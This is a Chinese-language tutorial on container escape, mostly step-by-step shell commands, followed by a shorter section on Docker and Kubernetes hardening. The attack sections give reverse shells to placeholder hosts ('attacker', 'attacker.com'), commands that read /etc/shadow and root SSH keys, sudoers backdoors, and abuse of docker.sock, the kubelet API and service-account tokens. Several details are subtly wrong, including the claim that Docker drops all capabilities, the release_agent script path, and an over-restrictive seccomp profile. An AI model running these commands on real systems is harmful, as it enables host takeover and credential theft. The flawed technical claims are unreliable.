# 容器逃逸

## 概述

容器逃逸（Container Escape）是指攻击者突破容器隔离边界，获取宿主机操作系统访问权限的过程。尽管Docker容器利用Linux命名空间（Namespace）和控制组（Cgroup）实现隔离，但错误配置和内核漏洞仍可导致逃逸。容器逃逸是云原生安全中最严重的威胁之一，允许攻击者从受感染的容器直接控制宿主机。

## 特权容器逃逸

### --privileged标志

`--privileged`标志赋予容器几乎所有的内核能力（Capabilities），绕过大部分隔离机制：

```bash
# 启动特权容器
docker run --privileged -it ubuntu bash

# 在特权容器内部执行逃逸操作
# 查看已挂载的设备
ls -la /dev/

# 直接操作宿主机磁盘
fdisk -l
# 找到/dev/sda1等宿主机磁盘设备

# 挂载宿主机根文件系统
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host bash
# 现在处于宿主机环境

# 查看宿主机进程
ps aux

# 查看宿主机网络
ip addr show
```

### Capabilities详解

Docker默认删除所有Capability，但`--privileged`或指定Capabilities会增加攻击面：

```bash
# 检查当前容器的Capabilities
cat /proc/self/status | grep Cap

# 解码Capabilities
capsh --decode=0000003fffffffff

# 危险Capabilities列表
# CAP_SYS_ADMIN - 最危险的capability，可执行mount等操作
# CAP_NET_ADMIN - 网络配置修改
# CAP_SYS_PTRACE - 进程调试和内存访问
# CAP_SYS_MODULE - 加载内核模块
# CAP_DAC_OVERRIDE - 绕过文件权限检查
# CAP_SYS_RAWIO - 原始I/O操作（端口/内存）

# 启动时授予特定Capability
docker run --cap-add=SYS_ADMIN -it ubuntu bash

# 使用CAP_SYS_ADMIN逃逸
mount -t cgroup -o memory cgroup /mnt/cgroup
# 创建cgroup并触发release_agent → 在宿主机执行命令
```

### Cgroup逃逸（release_agent）

```bash
# 步骤1：挂载Cgroup控制器
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp

# 步骤2：创建子cgroup
mkdir /tmp/cgrp/x

# 步骤3：设置release_agent（将在cgroup空时在宿主机执行）
echo "/tmp/escape.sh" > /tmp/cgrp/release_agent

# 步骤4：创建逃逸脚本
cat > /tmp/escape.sh << 'EOF'
#!/bin/bash
# 将容器root用户添加为宿主机sudoer
echo "container-user ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
# 或创建反向shell
bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'
EOF
chmod +x /tmp/escape.sh

# 步骤5：触发release_agent
# 将进程移出cgroup，触发空cgroup通知
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
echo 1 > /tmp/cgrp/x/notify_on_release

# 现在/tmp/escape.sh将在宿主机以root执行
```

## Docker Socket逃逸

Docker守护进程Socket（`/var/run/docker.sock`）的挂载是最常见的容器逃逸途径：

```bash
# 检查当前容器是否挂载了docker.sock
ls -la /var/run/docker.sock
# 如果存在，则容器可以访问Docker守护进程

# 逃逸步骤
# 1. 使用Docker客户端（或直接通过API）启动特权容器
docker -H unix:///var/run/docker.sock run -it --privileged \
  -v /:/host ubuntu bash

# 2. 在特权容器中，挂载宿主机文件系统
chroot /host bash
# 现在处于宿主机的root环境

# 3. 或者通过API直接操作
curl --unix-socket /var/run/docker.sock http://localhost/containers/json

# 4. 创建新容器挂载宿主机文件系统
curl -X POST --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "ubuntu",
    "Binds": ["/:/host:rw"],
    "Cmd": ["/bin/bash"],
    "Privileged": true
  }' \
  http://localhost/containers/create

# 5. 启动容器
curl --unix-socket /var/run/docker.sock \
  http://localhost/containers/container_id/start
```

### 暴力检测docker.sock

```bash
# 扫描常见Docker Socket路径
sock_paths=(
  "/var/run/docker.sock"
  "/run/docker.sock"
  "/var/run/docker-ce.sock"
  "/var/run/docker.sock"
  "/run/k3s/containerd/containerd.sock"
  "/run/containerd/containerd.sock"
)

for sock in "${sock_paths[@]}"; do
  if [ -S "$sock" ]; then
    echo "[+] Found Docker socket: $sock"
    # 测试访问
    curl --unix-socket "$sock" http://localhost/version
  fi
done
```

## Procfs逃逸

当容器的`/proc`文件系统可写或未正确隔离时，可通过Procfs逃逸：

### /proc/1/root访问

```bash
# 如果/proc/1/root可访问，可直接访问宿主机文件系统
ls -la /proc/1/root/

# 读取宿主机文件
cat /proc/1/root/etc/shadow
cat /proc/1/root/root/.ssh/id_rsa

# 写入宿主机文件
echo "container-user ALL=(ALL) NOPASSWD: ALL" > /proc/1/root/etc/sudoers.d/escape

# 创建反向Shell
cat > /proc/1/root/tmp/escape.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1
EOF
chmod +x /proc/1/root/tmp/escape.sh
```

### nsenter逃逸

```bash
# 通过/proc/1/ns/*访问宿主机的命名空间
# 需要CAP_SYS_ADMIN

# 查看宿主机命名空间
ls -la /proc/1/ns/

# 使用nsenter进入宿主机命名空间
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# 使用unshare创建新命名空间
unshare -m --propagation=unchanged bash

# 挂载宿主机根文件系统（需要CAP_SYS_ADMIN）
mount --bind /proc/1/root /mnt/host
chroot /mnt/host bash
```

## Kubernetes节点逃逸

Kubernetes环境中，Pod逃逸到宿主机节点：

### kubelet API逃逸

```bash
# 从Pod内部访问kubelet API
# kubelet默认在10250端口监听，如果未启用认证

# 获取Pod列表
curl -sk https://node-ip:10250/pods

# 在任意Pod中执行命令（无需认证）
curl -sk https://node-ip:10250/run/namespace/pod/container \
  -d "cmd=id"

# 挂载宿主机文件系统
curl -sk https://node-ip:10250/run/namespace/pod/container \
  -d "cmd=mount"

# 创建特权容器逃逸（需要更多条件）
```

### 服务账号Token滥用

```bash
# Pod内默认挂载服务账号Token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# 使用Token访问Kubernetes API
curl -sk https://kubernetes.default/api/v1/namespaces/default/pods \
  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"

# 检查服务账号权限
curl -sk https://kubernetes.default/apis/rbac.authorization.k8s.io/v1 \
  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  | jq '.resources[].verbs'
```

## 防御措施

### Docker安全配置

```bash
# 1. 始终使用非root用户运行容器
docker run -u 1000:1000 -it ubuntu bash

# 2. 删除所有Capabilities
docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE -it ubuntu bash

# 3. 只读根文件系统
docker run --read-only --tmpfs /tmp -it ubuntu bash

# 4. 禁止特权提升
docker run --security-opt=no-new-privileges -it ubuntu bash

# 5. Seccomp配置文件
docker run --security-opt seccomp=/path/to/seccomp-profile.json -it ubuntu bash

# 6. AppArmor配置
docker run --security-opt apparmor=my-apparmor-profile -it ubuntu bash

# 7. 不挂载docker.sock
# 绝对不要在容器内挂载/var/run/docker.sock

# 8. 限制系统调用
docker run --security-opt seccomp=default -it ubuntu bash
```

### Kubernetes Pod安全

```yaml
# Pod Security Admission (restricted级别)
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
  labels:
    pod-security.kubernetes.io/enforce: restricted
spec:
  containers:
  - name: app
    image: myapp:latest
    securityContext:
      runAsNonRoot: true
      runAsUser: 1000
      capabilities:
        drop: ["ALL"]
      readOnlyRootFilesystem: true
      seccompProfile:
        type: RuntimeDefault
```

### Seccomp配置文件

```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "architectures": ["SCMP_ARCH_X86_64"],
  "syscalls": [
    {
      "names": [
        "accept", "bind", "connect", "listen",
        "read", "write", "open", "close",
        "mmap", "munmap", "brk",
        "exit", "exit_group",
        "getpid", "gettid"
      ],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
```

### 安全配置清单

- **禁止特权容器**：`--privileged`不应在任何生产环境中使用
- **只读根文件系统**：使用`--read-only`防止文件系统修改
- **删除Capabilities**：`--cap-drop=ALL`后按需添加
- **禁止docker.sock**：绝不允许挂载Docker Socket
- **非root用户**：始终使用特定UID运行容器
- **Seccomp/AppArmor**：启用系统调用过滤
- **禁止特权提升**：`--security-opt=no-new-privileges`
- **资源限制**：限制CPU、内存、磁盘I/O
- **只读Procfs**：挂载为只读或使用hidepid选项
- **最新版本**：及时更新容器运行时（runc、containerd）
